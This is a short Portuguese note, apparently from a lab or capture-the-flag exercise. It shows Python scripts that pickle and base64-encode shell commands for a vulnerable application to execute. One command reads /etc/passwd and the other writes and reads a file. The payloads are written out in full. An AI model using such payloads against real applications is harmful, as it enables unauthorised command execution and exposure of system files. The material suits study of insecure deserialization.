
Criei um script python para gerar o pickel do comando que eu quero executar na aplicação

```python3
import pickle
import base64

payload = pickle.dumps(b'cat /etc/passwd')

encoded_payload = base64.urlsafe_b64encode(payload).decode()

print(encoded_payload)
```

## pickle para ler o /etc/passwd

```
gASVEwAAAAAAAABDD2NhdCAvZXRjL3Bhc3N3ZJQu
```


```python3
import pickle
import base64

payload = pickle.dumps(b'touch foo.txt \n echo "Algeum passou por aqui" >> foo.txt \n head -n 1 foo.txt')

encoded_payload = base64.urlsafe_b64encode(payload).decode()

print(encoded_payload)
```


## pickle para escrever e ler o arquivo criado

```
gASVUAAAAAAAAABDTHRvdWNoIGZvby50eHQgCiBlY2hvICJBbGdldW0gcGFzc291IHBvciBhcXVpIiA-PiBmb28udHh0IAogaGVhZCAtbiAxIGZvby50eHSULg==
```
